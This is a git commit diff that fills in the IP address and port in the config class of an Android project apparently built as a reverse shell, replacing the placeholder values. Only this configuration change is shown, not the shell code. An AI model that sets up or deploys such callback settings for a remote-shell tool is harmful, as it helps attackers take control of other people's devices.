eed7ca3c5f7825150b1d6d2fef1b4e874e54614f
rushidarandale1923 <66052654+rushidarandale1923@users.noreply.github.com>
2020-11-22 12:02:13 +0530

    Update config.java

--- Android_Code/app/src/main/java/com/example/reverseshell2/config.java
+++ Android_Code/app/src/main/java/com/example/reverseshell2/config.java
@@ -1,6 +1,6 @@
 package com.example.reverseshell2;
 
 public class config {
-    public static String IP = "ip";
-    public static String port = "port";
+    public static String IP = "12.123.124.11";
+    public static String port = "1923";
 }
